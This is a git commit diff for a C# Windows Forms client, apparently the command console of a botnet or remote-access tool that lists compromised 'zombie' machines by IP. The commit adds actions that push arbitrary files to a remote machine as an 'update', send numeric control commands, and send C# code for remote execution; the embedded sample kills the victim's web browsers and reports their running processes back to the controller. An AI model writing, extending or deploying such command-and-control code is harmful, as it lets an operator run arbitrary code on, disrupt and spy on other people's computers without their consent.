c5968000efb0d3ce589e284145fd9c10e237afb8
David Podzimek <davidpodzimek@windowslive.com>
2019-08-23 13:33:24 +0200

    [added multiple actions]

--- FirebridgeClient/Controls/ZombieView.Designer.cs
+++ FirebridgeClient/Controls/ZombieView.Designer.cs
@@ -30,8 +30,8 @@
         {
             this._image = new System.Windows.Forms.PictureBox();
             this._ip = new System.Windows.Forms.Label();
-            this.button1 = new System.Windows.Forms.Button();
             this.todo_delete_this = new System.Windows.Forms.Button();
+            this._buttonDetail = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this._image)).BeginInit();
             this.SuspendLayout();
             // 
@@ -54,18 +54,9 @@
             this._ip.TabIndex = 1;
             this._ip.Text = "<ip>";
             // 
-            // button1
-            // 
-            this.button1.Location = new System.Drawing.Point(170, 158);
-            this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(75, 23);
-            this.button1.TabIndex = 2;
-            this.button1.Text = "Detail";
-            this.button1.UseVisualStyleBackColor = true;
-            // 
             // todo_delete_this
             // 
-            this.todo_delete_this.Location = new System.Drawing.Point(138, 158);
+            this.todo_delete_this.Location = new System.Drawing.Point(128, 158);
             this.todo_delete_this.Name = "todo_delete_this";
             this.todo_delete_this.Size = new System.Drawing.Size(26, 23);
             this.todo_delete_this.TabIndex = 3;
@@ -73,12 +64,22 @@
             this.todo_delete_this.UseVisualStyleBackColor = true;
             this.todo_delete_this.Click += new System.EventHandler(this.Todo_delete_this_Click);
             // 
+            // _buttonDetail
+            // 
+            this._buttonDetail.Location = new System.Drawing.Point(160, 158);
+            this._buttonDetail.Name = "_buttonDetail";
+            this._buttonDetail.Size = new System.Drawing.Size(75, 23);
+            this._buttonDetail.TabIndex = 4;
+            this._buttonDetail.Text = "Detail";
+            this._buttonDetail.UseVisualStyleBackColor = true;
+            this._buttonDetail.Click += new System.EventHandler(this._buttonDetail_Click);
+            // 
             // ZombieView
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.Controls.Add(this._buttonDetail);
             this.Controls.Add(this.todo_delete_this);
-            this.Controls.Add(this.button1);
             this.Controls.Add(this._ip);
             this.Controls.Add(this._image);
             this.Name = "ZombieView";
@@ -94,7 +95,7 @@
 
         private System.Windows.Forms.PictureBox _image;
         private System.Windows.Forms.Label _ip;
-        private System.Windows.Forms.Button button1;
         private System.Windows.Forms.Button todo_delete_this;
+        private System.Windows.Forms.Button _buttonDetail;
     }
 }
--- FirebridgeClient/Views/ZombieDetailView.cs
+++ FirebridgeClient/Views/ZombieDetailView.cs
@@ -3,18 +3,103 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using FirebridgeShared.Models;
+using FirebridgeShared.Networking;
 
 namespace FirebridgeClient.Views
 {
     public partial class ZombieDetailView : Form
     {
-        public ZombieDetailView()
+        private Connection connection;
+        public ZombieDetailView(Connection connection)
         {
             InitializeComponent();
+            this.connection = connection;
+        }
+
+        public void Update(object sender, EventArgs e)
+        {
+            var f = new OpenFileDialog();
+            f.Multiselect = true;
+            if (f.ShowDialog() == DialogResult.OK)
+            {
+                var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
+                for (int i = 0; i < f.FileNames.Length; i++)
+                {
+                    update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
+                    update.Names.Add(f.SafeFileNames[i]);
+
+                }
+                connection.SendPacket(new Packet() { Id = 4, Data = update });
+            }
+
+        }
+
+        private void Button1_Click(object sender, EventArgs e)
+        {
+            connection.SendPacket(new Packet() { Id = 2, Data = 70 });
+        }
+
+        private void ResetApp(object sender, EventArgs e)
+        {
+            connection.SendPacket(new Packet() { Id = 2, Data = 71 });
+
+        }
+
+        private void Button4_Click(object sender, EventArgs e)
+        {
+
+            connection.SendPacket(new Packet() { Id = 50, Data = 71 });
+        }
+
+
+        private void SendCode(object sender, EventArgs e)
+        {
+            connection.SendPacket(new Packet()
+            {
+                Id = 1,
+                Data = new MiniProgramModel()
+                {
+                    Code = @"
+            using System;
+            using System.Diagnostics;
+            using System.Linq;
+            using FirebridgeShared.Networking;
+
+            namespace TestApp
+            {
+                public static class Program
+                {
+                    public static void Main(Connection s)
+                    {
+                        Process[] AllProcesses = Process.GetProcesses();
+                        foreach (var process in AllProcesses)
+                        {
+                            if (process.MainWindowTitle != """")
+                            {
+                                string k = process.ProcessName.ToLower();
+                                if (k == ""iexplore"" || k == ""iexplorer"" || k == ""chrome"" || k == ""firefox"")
+                                    process.Kill();
+                            }
+                        }
+
+                       s.SendPacket(new Packet() { Id = 0, Data = String.Join("","", Process.GetProcesses().Select(p => p.ProcessName.ToString()).ToArray())});
+
+                            }
+                }
+            }",
+                    EntryPoint = "TestApp.Program",
+                    References = new List<string>()
+                                {
+                                    "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll"
+                                },
+                }
+            });
         }
     }
 }
